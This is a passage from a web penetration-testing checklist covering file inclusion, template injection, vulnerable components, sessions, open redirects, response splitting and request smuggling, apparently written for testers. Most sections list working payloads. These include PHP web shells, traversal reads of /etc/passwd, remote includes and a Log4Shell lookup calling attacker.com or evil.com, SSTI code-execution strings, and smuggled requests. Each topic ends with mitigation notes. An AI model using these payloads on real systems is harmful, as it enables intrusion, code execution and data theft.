    * **Payload Examples**:
        
        * `?file=../../../../etc/passwd`
        
        * `?file=../../../../windows/win.ini`
        
        * `?page=../../../../var/log/apache2/access.log`
        
    
    * **What to Test**:
        
        * Access sensitive files like `/etc/passwd`, `/etc/hosts`, or logs.
        
    
    * * *
    
    ### **3\.** **Null Byte Injection**
    
    * **Payload**:
        
        * `?file=../../../../etc/passwd%00`
        
        * **Why It Works**:
            * Null bytes can bypass string concatenation and allow raw file reads.
        
    
    * **Where to Test**:
        
        * Applications that append extensions (e.g., `.php` or `.html`).
        
    
    * * *
    
    ### **4\.** **Bypass Input Validation**
    
    * **Encodings**:
        
        * URL encoding: `%2e%2e%2f` for `../`
        
        * Double encoding: `%252e%252e%252f`
        
        * Unicode encoding: `%c0%ae%c0%ae/%c0%ae%c0%ae/`
        
    
    * **Case Variants**:
        
        * Mixed case traversal: `..//..//..//..//EtC/PaSsWd`
        
    
    * * *
    
    ### **5\.** **Leverage Logs**
    
    * **What to Do**:
        
        * Inject PHP or code into log files and include them:
            * Inject into `/var/log/apache2/access.log`:
                
                    <?php system($_GET['cmd']); ?>
                    
                
        
        * Payload:
            * `?file=../../../../var/log/apache2/access.log&cmd=id`
        
    
    * * *
    
    ### **6\.** **Writable Directories**
    
    * **What to Test**:
        
        * Include files in writable directories:
            
            * `?file=../../../../tmp/malicious.php`
            
            * Payload:
                
                    <?php echo shell_exec($_GET['cmd']); ?>
                    
                
        
    
    * * *
    
    ### **7\.** **Error Message Analysis**
    
    * **What to Look For**:
        
        * Errors revealing file paths or failed includes:
            
            * `File not found: /var/www/html/config.php`
            
            * `Warning: include(): Failed opening required '/etc/passwd'`
        
    
    * * *
    
    ### **RFI Testing Checklist**
    
    ### **1\.** **Basic RFI Payloads**
    
    * **Payload Examples**:
        
        * `?file=http://attacker.com/malicious.php`
        
        * `?template=http://evil.com/shell.txt`
        
        * **Shell Example**:
            
                <?php system($_GET['cmd']); ?>
                
            
        
    
    * **What to Test**:
        
        * Observe if the server executes external files.
        
    
    * * *
    
    ### **2\.** **Verify Execution**
    
    * **How to Confirm**:
        
        * Use a server to host the payload:
            
            * Host PHP payload: `<?php echo shell_exec('id'); ?>`
            
            * URL: `http://attacker.com/shell.php`
        
        * Access:
            * `?file=http://attacker.com/shell.php`
        
    
    * **Expected Behavior**:
        
        * The response includes the output of the command.
        
    
    * * *
    
    ### **3\.** **SSRF Leverage**
    
    * **Payloads**:
        
        * `?file=http://127.0.0.1/`
        
        * `?file=http://169.254.169.254/latest/meta-data/`
        
        * **What to Test**:
            * Exploit RFI to access internal resources.
        
    
    * * *
    
    ### **4\.** **Encoding and Obfuscation**
    
    * **What to Do**:
        
        * Test with encoded payloads:
            
            * `http:%2f%2fattacker.com%2fshell.php`
            
            * `http:%2f%2f127.0.0.1%2f`
        
    
    * **Why It Works**:
        
        * Obfuscated URLs might bypass filters.
        
    
    * * *
    
    ### **Testing Common Protections and Bypasses**
    
    ### **1\.** **File Extension Restrictions**
    
    * **What to Do**:
        
        * Append extensions like `.php`, `.html`, or `.txt`.
        
        * Null byte bypass: `../../../../etc/passwd%00.txt`.
        
    
    * * *
    
    ### **2\.** **Whitelisted Domains**
    
    * **What to Test**:
        
        * Use open redirects to bypass domain restrictions:
            * Example: `?file=http://trusted.com/redirect?url=http://evil.com/shell.php`.
        
    
    * * *
    
    ### **3\.** **File Inclusion in Protocols**
    
    * **Payloads**:
        
        * `file:///etc/passwd` (Local files)
        
        * `php://filter/convert.base64-encode/resource=../../../../etc/passwd`
        
        * `data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOyA/Pg==`
        
    
    * * *
    
    ### **Tools for LFI/RFI Testing**
    
    * **Manual Tools**:
        
        * Burp Suite (Repeater for injecting payloads)
        
        * Postman
    
    * **Automated Tools**:
        
        * OWASP ZAP
        
        * Nikto
        
        * Nuclei (LFI/RFI templates)
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify input sanitization:
        
        * Block traversal sequences like `../`.
        
    
    * Validate file paths:
        
        * Restrict to intended directories.
        
    
    * Disable remote file inclusion:
        
        * `allow_url_include = Off` in PHP.
        
    
    * Use whitelisting:
        
        * Only allow specific, pre-defined files.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * File inclusion is restricted to intended files.
        
        * External file execution is disabled.
    
    * **Vulnerable**:
        * Access to sensitive files or execution of external scripts.
    

* **Server-Side Template Injection ( SSTI )**
    
    ### **Server-Side Template Injection (SSTI)**
    
    **SSTI vulnerabilities** occur when user-supplied input is rendered into server-side templates without proper sanitization. This can lead to code execution, data exposure, or privilege escalation depending on the server-side template engine.
    
    * * *
    
    ### **1.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Form fields or parameters that affect template rendering.
        
        * Search bars, comments, or user profile fields.
        
        * API endpoints rendering templates.
        
        * Email templates, invoices, or other dynamic documents.
        
    
    * * *
    
    ### **2\.** **Test Basic Injection**
    
    * **What to Do**:
        
        * Inject simple template syntax for different engines:
            
            * Jinja2 (Python): `{{7*7}}`
            
            * Twig (PHP): `{{7*7}}`
            
            * Freemarker (Java): `${7*7}`
            
            * Velocity (Java): `#set($x=7*7)`
        
        * **Expected Outcome**:
            * The server renders `49` or an error indicating template parsing.
        
    
    * * *
    
    ### **3\.** **Detect Template Engine**
    
    * **What to Do**:
        
        * Test payloads specific to common engines:
            
            * Jinja2: `{{config.items()}}`
            
            * Freemarker: `${'freemarker.template.Configuration'!}`
            
            * Velocity: `#set($x="velocity")`
        
        * **Expected Outcome**:
            * Error messages or rendered content reveal the engine.
        
    
    * * *
    
    ### **4\.** **Exploit SSTI for Arbitrary Code Execution**
    
    * **What to Do**:
        
        * Inject payloads to execute system commands:
            
            * Jinja2:
                
                    {{''.class.mro()[1].subclasses()}}
                    
                
            
            * Twig:
                
                    {{_self.env.getFilter('system').filter('ls')}}
                    
                
        
        * **Expected Outcome**:
            * Server executes the command (e.g., directory listing).
        
    
    Note : Based on your template take the code for Executing the arbitrary Code Execution
    
    * * *
    
    ### **5\.** **Test with Special Characters**
    
    * **What to Do**:
        
        * Inject characters often used in templates:
            * `{{`, `}}`, `${`, `#`, `}}}`
        
        * **Example**:
            * `?q={{7*7}}`
        
        * **Expected Outcome**:
            * Template injection works or triggers errors.
        
    
    * * *
    
    ### **6.** **Error-Based Discovery**
    
    * **What to Do**:
        
        * Trigger server errors to reveal stack traces:
            * Payloads:
                
                * `{{config.items()}}` (Jinja2)
                
                * `${'freemarker.template.Configuration'!}` (Freemarker)
        
        * **Expected Outcome**:
            * The server reveals information about the template engine or internal structure.
        
    
    * * *
    
    ### **7\.** **Escalation Techniques**
    
    ### **a.** **Read Server Files**
    
    * Payloads:
        
        * Jinja2:
            
                {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
                
            
        
        * Twig:
            
                {{_self.env.getFilter('file').filter('/etc/passwd')}}
                
            
        
    
    ### **b.** **Execute System Commands**
    
    * Payloads:
        
        * Jinja2:
            
                {{''.__class__.__mro__[2].__subclasses__()[59]('ls').read()}}
                
            
        
        * Freemarker:
            
                ${"freemarker.template.utility.Execute"?new()("ls")}
                
            
        
    
    ### **c.** **Access Sensitive Variables**
    
    * Payloads:
        
        * `${application}` (Freemarker)
        
        * `{{request.cookies}}` (Jinja2)
        
    
    * * *
    
    ### **8\.** **Contextual Testing**
    
    * **What to Test**:
        
        * Test SSTI vulnerabilities in specific contexts:
            
            * Email templates
            
            * Logs rendering dynamic content
            
            * PDF generation
        
        * **Example**:
            * Inject template syntax in an email field and check the rendered email for SSTI execution.
        
    
    * * *
    
    ### **9\.** **Tools for SSTI Testing**
    
    * **Manual**:
        * Burp Suite Repeater for injecting payloads.
    
    * **Automated**:
        
        * OWASP ZAP (custom scripts for SSTI detection).
        
        * Nuclei (SSTI templates).
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify input sanitization:
        
        * Ensure user inputs are properly escaped.
        
    
    * Use template sandboxing:
        
        * Restrict available functionality in template engines.
        
    
    * Validate output encoding:
        
        * Ensure data rendered into templates is safe.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        * User input is escaped, and template syntax injection fails.
    
    * **Vulnerable**:
        * Template syntax is executed, allowing information disclosure or code execution.
    

* **Known Vulnerable Components**
    
    ### **Known Vulnerable Components**
    
    **Testing for known vulnerable components** involves identifying and exploiting outdated or insecure libraries, frameworks, plugins, or dependencies in an application. These vulnerabilities can lead to various attacks such as remote code execution, privilege escalation, or sensitive data exposure.
    
    * * *
    
    ### **1.** **Identify Components in Use**
    
    * **Where to Test**:
        
        * Application frameworks (e.g., Spring, Laravel, Django).
        
        * Third-party libraries and plugins.
        
        * Frontend frameworks (e.g., Angular, React, jQuery).
        
        * Backend components (e.g., Apache, Nginx, Tomcat).
        
        * Databases (e.g., MySQL, PostgreSQL, MongoDB).
        
        * Operating systems and kernel versions.
        
    
    * **What to Do**:
        
        * Check for dependency manifests:
            
            * `package.json` (Node.js)
            
            * `requirements.txt` (Python)
            
            * `pom.xml` (Java Maven)
            
            * `composer.json` (PHP)
            
            * `Gemfile` (Ruby)
        
        * Identify server software and versions via banners, error messages, or headers.
        
    
    * * *
    
    ### **2\.** **Detect Software Versions**
    
    * **Manual Techniques**:
        
        * Inspect HTTP headers for version information:
            
            * `Server: Apache/2.4.29`
            
            * `X-Powered-By: PHP/7.4.3`
        
        * Look for error messages exposing version details.
        
    
    * **Automated Scanning**:
        
        * Use tools like `Nmap`, `Nikto`, or `Wappalyzer` to fingerprint components.
        
        * Example Nmap command:
            
                nmap -sV -p 80,443 target.com
                
            
        
    
    * * *
    
    ### **3\.** **Test for Outdated Libraries**
    
    * **Frontend Libraries**:
        
        * Check for outdated JavaScript libraries:
            
            * Use a scanner like [Retire.js](https://github.com/RetireJS/retire.js).
            
            * Example:
                
                    retire --outputformat json --outputpath retire.json
                    
                
        
    
    * **Backend Libraries**:
        
        * Identify backend dependency versions using `Dependency-Check` or SCA tools.
        
    
    * * *
    
    ### **4\.** **Search for Known Vulnerabilities**
    
    * **What to Do**:
        
        * Search the identified component versions in vulnerability databases:
            
            * [CVE Details](https://www.cvedetails.com/)
            
            * [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
            
            * [Exploit-DB](https://www.exploit-db.com/)
        
    
    * **What to Look For**:
        
        * Known CVEs affecting the identified versions.
        
        * Exploits available in public databases.
        
    
    * * *
    
    ### **5.** **Exploit Vulnerable Components**
    
    * **Test for Exploitable Vulnerabilities**:
        
        * Identify and attempt exploits specific to the component.
        
        * Example exploits:
            
            * Apache Struts RCE (CVE-2017-5638).
            
            * Log4Shell (CVE-2021-44228).
        
    
    * **Use Exploitation Tools**:
        
        * **Metasploit**:
            
                use exploit/multi/http/struts_code_exec
                
            
        
        * **Searchsploit**:
            
                searchsploit apache struts
                
            
        
    
    * * *
    
    ### **6\.** **Framework/Plugin-Specific Tests**
    
    ### **a.** **CMS Plugins**
    
    * Test for outdated WordPress, Joomla, or Drupal plugins:
        
        * Use **WPScan** for WordPress:
            
                wpscan --url http://example.com --enumerate p
                
            
        
    
    * Look for default or vulnerable plugins/modules.
        
    
    ### **b.** **Java Applications**
    
    * Identify vulnerable dependencies:
        
        * Log4j: Test for Log4Shell using specific payloads:
            
                ${jndi:ldap://attacker.com/a}
                
            
        
    
    ### **c.** **PHP Applications**
    
    * Look for exposed PHP versions and known vulnerabilities:
        
        * Test for insecure PHP functions (`exec`, `shell_exec`).
        
    
    * * *
    
    ### **7\.** **OS and Infrastructure Testing**
    
    * **Operating System**:
        
        * Check the OS version:
            
                uname -a
                
            
        
        * Search for OS-specific vulnerabilities (e.g., kernel exploits).
        
    
    * **Databases**:
        
        * Enumerate database versions:
            
            * MySQL:
                
                    SELECT version();
                    
                
            
            * PostgreSQL:
                
                    SELECT version();
                    
                
        
        * Look for exploits targeting outdated database versions.
        
    
    * * *
    
    ### **8\.** **Assess Dependency Management**
    
    * **What to Check**:
        
        * Outdated dependencies in manifest files.
        
        * Use dependency analysis tools:
            
            * **OWASP Dependency-Check**:
                
                    dependency-check --project MyProject --scan /path/to/project
                    
                
            
            * **Snyk**:
                
                    snyk test
                    
                
        
    
    * * *
    
    ### **9\.** **Check for Unpatched CVEs**
    
    * **What to Do**:
        
        * Compare component versions with available patches.
        
        * Validate if patches have been applied for disclosed vulnerabilities.
        
    
    * * *
    
    ### **10\.** **Tools for Known Vulnerable Components**
    
    * **Manual Tools**:
        
        * Browser extensions like Wappalyzer or BuiltWith.
        
        * Command-line tools like Curl or Nmap.
        
    
    * **Automated Tools**:
        
        * OWASP Dependency-Check.
        
        * Retire.js.
        
        * WPScan (for WordPress).
        
        * Nuclei (vulnerability templates for known components).
        
        * Nessus or OpenVAS.
        
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify that all components are up-to-date.
        
    
    * Ensure dependency versions are regularly reviewed.
        
    
    * Remove unused or unnecessary libraries.
        
    
    * Use automated CI/CD pipelines for dependency monitoring.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Components are updated to the latest versions.
        
        * No known vulnerabilities are present in the stack.
    
    * **Vulnerable**:
        * Outdated or unpatched components with disclosed CVEs.
    

* **Session Management**
    
    ### **Session Management**
    
    Session management vulnerabilities occur when applications mishandle session identifiers, leading to risks like session fixation, session hijacking, and unauthorized access. Below is a comprehensive checklist for testing session management mechanisms.
    
    * * *
    
    ### **1\.** **Identify Session Management Mechanisms**
    
    * **Where to Test**:
        
        * Session cookies.
        
        * Tokens in headers (e.g., `Authorization: Bearer <token>`).
        
        * URL parameters containing session identifiers.
        
    
    * **What to Look For**:
        
        * Check how sessions are maintained:
            
            * Cookies (`PHPSESSID`, `JSESSIONID`, etc.).
            
            * LocalStorage/SessionStorage.
            
            * Hidden form fields or query parameters.
        
    
    * * *
    
    ### **2\.** **Test Session Token Security**
    
    ### **a. Predictability**
    
    * Analyze session token structure:
        
        * Use tools like Burp Suite or Python scripts to capture and analyze multiple session tokens.
        
    
    * Check if tokens are:
        
        * Random or sequential.
        
        * Based on time, IP, or user-specific data.
        
    
    ### **b. Length**
    
    * Verify if the session token is sufficiently long (e.g., >=128 bits).
        
    
    * Test short tokens for brute-force susceptibility.
        
    
    ### **c. Sensitive Data**
    
    * Inspect tokens for sensitive information:
        
        * Usernames, passwords, or internal IDs.
        
    
    * Decode Base64-encoded tokens and inspect their contents.
        
    
    * * *
    
    ### **3\.** **Cookie Security Flags**
    
    * Check if session cookies are:
        
        * **Secure**: Sent only over HTTPS.
        
        * **HttpOnly**: Not accessible via client-side scripts.
        
        * **SameSite**:
            
            * `Strict`: Cookies sent only in same-origin requests.
            
            * `Lax`: Cookies sent with GET requests from external domains.
        
    
    * * *
    
    ### **4\.** **Session Token Lifecycle**
    
    ### **a. Regeneration**
    
    * Verify if session tokens are regenerated:
        
        * After login/logout.
        
        * During privilege escalation (e.g., switching to admin role).
        
    
    ### **b. Expiry**
    
    * Check for session timeout:
        
        * Inactivity timeout (e.g., 15-30 minutes).
        
        * Absolute timeout (e.g., forced logout after a fixed period).
        
    
    * Test if expired tokens are invalidated.
        
    
    * * *
    
    ### **5\.** **Test for Session Fixation**
    
    * **What to Do**:
        
        * Set or inject a known session ID before login:
            * Example: `Set-Cookie: PHPSESSID=attacker_session_id;`
        
        * Log in as the victim and check if the session ID remains unchanged.
        
    
    * **Expected Outcome**:
        
        * The server generates a new session ID after login.
        
    
    * * *
    
    ### **6\.** **Test for Session Hijacking**
    
    ### **a. Capture and Replay Tokens**
    
    * Capture session tokens using:
        
        * Network sniffing (e.g., Wireshark, Burp Suite).
        
        * JavaScript access (if cookies lack `HttpOnly`).
        
    
    * Replay the captured token in a different browser or device.
        
    
    * **Expected Outcome**:
        
        * The server invalidates replayed tokens or ties them to specific client attributes.
        
    
    ### **b. Cross-Site Scripting (XSS)**
    
    * Inject XSS payloads to steal session cookies:
        
        * `<script>alert(document.cookie)</script>`
        
        * Use tools like Burp Collaborator to exfiltrate tokens.
        
    
    * * *
    
    ### **7\.** **Test for Insecure Token Storage**
    
    * Check where session tokens are stored:
        
        * Cookies, LocalStorage, or SessionStorage.
        
    
    * Test for tokens stored in:
        
        * HTML source code.
        
        * Browser caches.
        
        * Logs.
        
    
    * * *
    
    ### **8\.** **Test for Session Logout**
    
    * Verify logout behavior:
        
        * Does logout invalidate the session token?
        
        * Check if the token can still be used after logout.
        
    
    * Test across devices or browsers:
        
        * Log out on one device and verify session invalidation on others.
        
    
    * * *
    
    ### **9\.** **Test for Concurrent Sessions**
    
    * Log in on multiple devices or browsers simultaneously.
        
    
    * Check if the application:
        
        * Allows multiple concurrent sessions.
        
        * Terminates old sessions after a new login.
        
    
    * * *
    
    ### **10\.** **Test for Cross-Site Request Forgery (CSRF)**
    
    * Check if session-based actions are protected against CSRF:
        
        * Test for missing CSRF tokens.
        
        * Use CSRF PoC payloads to exploit actions like password changes.
        
    
    * * *
    
    ### **11\.** **Test for Logout CSRF**
    
    * Craft a CSRF payload to log out a user:
        
        * Example:
            
                <img src="http://example.com/logout">
                
            
        
    
    * Check if logout requires additional validation (e.g., CSRF token).
        
    
    * * *
    
    ### **12\.** **Test Session Token in URLs**
    
    * Check if session tokens are passed in URLs:
        
        * Example: `http://example.com?sessionid=abc123`
        
    
    * Test if tokens in URLs are logged in:
        
        * Browser history.
        
        * Web server logs.
        
    
    * * *
    
    ### **13\.** **Session Idle Timeout**
    
    * Leave a session idle and monitor:
        
        * Does the session expire after the specified duration?
        
        * Does user interaction reset the timer?
        
    
    * * *
    
    ### **14\.** **Session Token Replay on Other IPs**
    
    * Capture a session token and replay it from:
        
        * A different IP address.
        
        * A different device.
        
    
    * Check if the application restricts session reuse across IPs.
        
    
    * * *
    
    ### **15\.** **Tools for Session Management Testing**
    
    * **Manual**:
        
        * Browser Developer Tools.
        
        * Burp Suite (Session token analysis, Repeater for replay).
    
    * **Automated**:
        
        * OWASP ZAP.
        
        * Nikto (for cookie flags).
        
        * Nuclei templates for session management.
    
    * * *
    
    ### **Mitigation Testing**
    
    * Ensure proper configuration:
        
        * Secure, HttpOnly, and SameSite flags for cookies.
        
        * Session token regeneration after login.
        
        * Timeout mechanisms for idle and absolute session lifetimes.
        
    
    * Validate that sensitive actions require reauthentication.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Tokens are random, secure, and protected with flags.
        
        * Session tokens expire and are invalidated upon logout.
    
    * **Vulnerable**:
        * Predictable tokens, lack of session regeneration, or improper token storage.
    

* **Open redirection**
    
    ### **Open Redirection**
    
    Open Redirection vulnerabilities occur when a web application redirects users to external or unintended URLs based on unvalidated user input. These vulnerabilities can be exploited for phishing, stealing sensitive data, or other malicious activities.
    
    * * *
    
    ### **1.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Redirect parameters in URLs (e.g., `?redirect=`, `?url=`, `?next=`, `?return=`)
        
        * HTTP headers (`Referer`, `X-Forwarded-For`)
        
        * Hidden form fields with redirect URLs.
        
        * Application workflows that involve redirects (e.g., login, logout, payment, or error handling).
        
    
    * **What to Look For**:
        
        * Parameters that accept URLs or paths for redirection.
        
    
    * * *
    
    ### **2\.** **Test for Basic Open Redirect**
    
    * **What to Do**:
        
        * Replace the redirect parameter with an external URL:
            
            * `?redirect=https://attacker.com`
            
            * `?next=https://evil.com`
        
        * Observe if the application redirects to the provided URL.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: The application redirects to the injected URL.
        
        * Secure: The application validates and denies the external URL.
        
    
    * * *
    
    ### **3\.** **Relative Path Exploitation**
    
    * **What to Do**:
        
        * Test with relative paths to bypass validation:
            
            * `?redirect=//attacker.com`
            
            * `?url=///evil.com`
            
            * `?next=/../attacker.com`
        
        * Observe if the server redirects to the malicious domain.
        
    
    * * *
    
    ### **4\.** **URL Encoded Payloads**
    
    * **What to Do**:
        
        * Use encoded payloads to bypass input validation:
            
            * `%2F%2Fevil.com`
            
            * `%2e%2e%2f%2fattacker.com`
            
            * `https%3A%2F%2Fevil.com`
        
    
    * **Expected Outcome**:
        
        * Vulnerable: The application processes the encoded URL and redirects.
        
        * Secure: The application detects and blocks encoded URLs.
        
    
    * * *
    
    ### **5\.** **Open Redirect with Trusted Domains**
    
    * **What to Do**:
        
        * Use open redirects on trusted domains to chain attacks:
            * `https://trusted.com/redirect?url=https://evil.com`
        
        * **Why It Works**:
            * Attackers exploit trusted domains to bypass user trust.
        
        * **How to Test**:
            * Identify subdomains or trusted partners with redirect functionality.
        
    
    * * *
    
    ### **6\.** **HTTP Header Manipulation**
    
    * **What to Do**:
        
        * Inject malicious URLs into HTTP headers:
            
            * Modify the `Referer` or `X-Forwarded-For` header:
                
                    Referer: https://attacker.com
                    
                
            
            * Check if the application processes and redirects based on header values.
        
    
    * * *
    
    ### **7\.** **Bypass Input Validation**
    
    * **What to Do**:
        
        * Test for validation bypass:
            
            * Add trusted domain prefixes: `https://trusted.com@evil.com`
            
            * Use ambiguous URLs: `https://trusted.com.evil.com`
            
            * Add irrelevant query parameters:
                * `?redirect=https://trusted.com?next=https://evil.com`
        
        * Observe if validation checks are bypassed.
        
    
    * * *
    
    ### **8\.** **Test Application Workflows**
    
    * **Where to Test**:
        
        * Login redirects: After successful or failed login attempts.
        
        * Logout redirects: Post-logout redirection.
        
        * Payment gateways: Redirection after transactions.
        
        * Error pages: Redirections for handling missing or forbidden pages.
        
    
    * **What to Do**:
        
        * Replace expected redirect URLs with malicious ones.
        
    
    * * *
    
    ### **9\.** **Exploit Chained Redirections**
    
    * **What to Do**:
        
        * Identify chained redirections:
            * Example:
                
                    https://example.com/redirect?next=https://trusted.com/redirect?url=https://evil.com
                    
                
        
        * Test each step of the redirection chain for validation bypass.
        
    
    * * *
    
    ### **10\.** **Tools for Testing Open Redirects**
    
    * **Manual Testing**:
        
        * Modify URL parameters directly in the browser.
        
        * Use tools like Postman or Burp Suite to test HTTP headers and parameters.
    
    * **Automated Testing**:
        
        * OWASP ZAP (Active Scan rules for open redirects).
        
        * Nuclei (Open Redirect templates).
        
        * Nikto (checks for vulnerable parameters).
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify if the application validates redirect URLs:
        
        * Allow only whitelisted URLs or domains.
        
        * Deny relative paths, ambiguous URLs, and external domains.
        
    
    * Test if input sanitization or encoding prevents redirection.
        
    
    * Validate the use of hardcoded or server-controlled redirect destinations.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * The application only redirects to whitelisted or internal destinations.
        
        * Validation prevents all external or malformed URLs.
    
    * **Vulnerable**:
        * The application redirects to arbitrary or malicious destinations.
    

* **HTTP response splitting**
    
    ### **HTTP Response Splitting**
    
    **HTTP Response Splitting** vulnerabilities occur when an attacker manipulates HTTP headers in server responses by injecting `CRLF` (`\r\n`) characters. This can lead to attacks such as header injection, cache poisoning, and cross-site scripting (XSS).
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Query parameters (e.g., `?user=name`).
        
        * HTTP headers (e.g., `User-Agent`, `Referer`, `X-Forwarded-For`).
        
        * Form fields that influence headers or responses.
        
        * APIs or endpoints returning dynamic data in headers.
        
    
    * * *
    
    ### **2\.** **Test for Basic CRLF Injection**
    
    * **What to Do**:
        
        * Inject basic payloads containing `\r\n` to manipulate headers:
            
            * `%0d%0a` (URL-encoded CRLF)
            
            * `\r\n` (Literal CRLF)
            
            * `%0D%0A` (Case-insensitive encoding)
        
        * **Example**:
            * `http://example.com?user=test%0d%0aHeader:Injected`
        
    
    * * *
    
    ### **3\.** **Inject New Headers**
    
    * **What to Do**:
        
        * Inject headers after CRLF:
            * Payload: `%0d%0aX-Test-Header: Exploited`
        
        * **Expected Outcome**:
            * The server adds the injected header in the response.
        
    
    * * *
    
    ### **4\.** **Split the Response**
    
    * **What to Do**:
        
        * Inject payloads that split the HTTP response:
            * Payload: `%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert('XSS')</script>`
        
        * **Expected Outcome**:
            * The response splits, and the second part is treated as a new HTTP response.
        
    
    * * *
    
    ### **5\.** **Cache Poisoning**
    
    * **What to Do**:
        
        * Inject headers to manipulate cached responses:
            * Payload: `%0d%0aCache-Control: max-age=0`
        
        * **Expected Outcome**:
            * The poisoned header affects subsequent users receiving the cached response.
        
    
    * * *
    
    ### **6\.** **Test for Reflected Headers**
    
    * **What to Do**:
        
        * Identify parameters reflected in HTTP headers (e.g., `Location`, `Content-Type`).
        
        * Inject CRLF payloads into those parameters:
            * Example:
                
                    http://example.com?redirect=%0d%0aLocation:%20http://evil.com
                    
                
        
        * **Expected Outcome**:
            * The server processes the injected CRLF and modifies the headers.
        
    
    * * *
    
    ### **7\.** **Test for Error Messages**
    
    * **What to Look For**:
        
        * Server error messages indicating CRLF injection:
            * `HTTP/1.1 200 OK\r\nHeader:Injected`
        
    
    * * *
    
    ### **8\.** **Chaining Attacks**
    
    ### **a. XSS Injection**
    
    * **What to Do**:
        
        * Inject JavaScript payloads into the split response:
            * Payload: `%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert('XSS')</script>`
        
    
    * **Expected Outcome**:
        
        * The injected script executes in the user's browser.
        
    
    ### **b. Open Redirect**
    
    * **What to Do**:
        
        * Inject redirection headers:
            * Payload: `%0d%0aLocation: http://evil.com`
        
    
    * **Expected Outcome**:
        
        * The server redirects users to a malicious site.
        
    
    ### **c. Cookie Manipulation**
    
    * **What to Do**:
        
        * Inject `Set-Cookie` headers:
            * Payload: `%0d%0aSet-Cookie: session=attacker; HttpOnly`
        
    
    * **Expected Outcome**:
        
        * The injected cookie is set in the victim's browser.
        
    
    * * *
    
    ### **9\.** **Bypass Input Validation**
    
    * **Encodings**:
        
        * URL-encode CRLF characters multiple times:
            * `%250d%250a` (Double encoding).
        
    
    * **Obfuscation**:
        
        * Use mixed case or alternative encodings:
            * `%0d%0a` ‚Üí `%0D%0A`.
        
    
    * * *
    
    ### **10\.** **Tools for Testing HTTP Response Splitting**
    
    * **Manual**:
        
        * Burp Suite (Repeater to inject payloads).
        
        * Postman (for API testing).
    
    * **Automated**:
        
        * OWASP ZAP (Active scan rules for response splitting).
        
        * Nikto (for header-related vulnerabilities).
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify proper sanitization:
        
        * Ensure input fields strip or encode `\r\n` characters.
        
    
    * Check header construction:
        
        * Ensure headers are properly concatenated using secure APIs.
        
    
    * Test for hardcoded or whitelisted header values.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * The server rejects or sanitizes CRLF injection attempts.
        
        * Headers and responses remain unaffected by injected payloads.
    
    * **Vulnerable**:
        * The server processes CRLF payloads, leading to header injection or response splitting.
    

* **HTTP Request Smuggling**
    
    ### **HTTP Request Smuggling**
    
    **HTTP Request Smuggling** occurs when an attacker exploits inconsistencies in the interpretation of HTTP request headers between front-end (e.g., load balancers, reverse proxies) and back-end servers. This can lead to various attacks, including request manipulation, cache poisoning, and unauthorized access.
    
    * * *
    
    ### **1.** **Identify Vulnerable Architectures**
    
    * **Where to Test**:
        
        * Applications behind load balancers or reverse proxies.
        
        * Systems with multiple layers of servers interpreting HTTP requests.
        
        * APIs using HTTP/1.1 with chunked encoding.
        
    
    * * *
    
    ### **2\.** **Test for Basic HTTP Smuggling**
    
    ### **a.** **CL.TE (Content-Length vs Transfer-Encoding)**
    
    * **What to Do**:
        
        * Send a request with conflicting `Content-Length` and `Transfer-Encoding` headers:
            
                POST / HTTP/1.1
                Host: vulnerable.com
                Content-Length: 13
                Transfer-Encoding: chunked
                
                0
                
                GET /admin HTTP/1.1
                Host: vulnerable.com
                
            
        
    
    * **Expected Outcome**:
        
        * The front-end interprets `Content-Length`, while the back-end processes the `Transfer-Encoding` chunked payload.
        
    
    ### **b.** **TE.CL (Transfer-Encoding vs Content-Length)**
    
    * **What to Do**:
        
        * Reverse the logic:
            
                POST / HTTP/1.1
                Host: vulnerable.com
                Transfer-Encoding: chunked
                Content-Length: 30
                
                0
                
                GET /admin HTTP/1.1
                Host: vulnerable.com
                
            
        
    
    * **Expected Outcome**:
        
        * The front-end processes `Transfer-Encoding`, while the back-end uses `Content-Length`.
        
    
    * * *
    
    ### **3\.** **Test for Other Encodings**
    
    ### **a.** **TE.TE (Dual Transfer-Encoding)**
    
    * **What to Do**:
        
        * Include two `Transfer-Encoding` headers:
            
                POST / HTTP/1.1
                Host: vulnerable.com
                Transfer-Encoding: chunked
                Transfer-Encoding: identity
                
                0
                
                GET /admin HTTP/1.1
                Host: vulnerable.com
                
            
        
    
    ### **b.** **Chunked Encoding Variations**
    
    * **What to Do**:
        
        * Modify chunked encoding formats to exploit parsing inconsistencies:
            
            * Chunk size variations (`0x10`, `16`, `0010`).
            
            * Null byte injection (`0%00`).
        
    
    * * *
    
    ### **4\.** **Identify Impact**
    
    * **Potential Outcomes**:
        
        * **Bypass Access Controls**:
            * Inject unauthorized requests (e.g., `GET /admin`).
        
        * **Cache Poisoning**:
            * Poison the cache with attacker-controlled content.
        
        * **Cross-Site Scripting (XSS)**:
            * Inject malicious payloads in responses.
        
        * **Session Hijacking**:
            * Steal or manipulate session cookies.
        
    
    * * *
    
    ### **5\.** **Test for Blind HTTP Smuggling**
    
    * **What to Do**:
        
        * Use time-based techniques to detect back-end behavior:
            * Payload:
                
                    POST / HTTP/1.1
                    Host: vulnerable.com
                    Content-Length: 4
                    Transfer-Encoding: chunked
                    
                    5
                    G
                    0
                    
                    GET / HTTP/1.1
                    Host: vulnerable.com
                    
                
        
        * **Expected Outcome**:
            * Observe timing discrepancies indicating request queue manipulation.
        
    
    * * *
    
    ### **6\.** **Tools for HTTP Smuggling Testing**
    
    * **Manual Tools**:
        
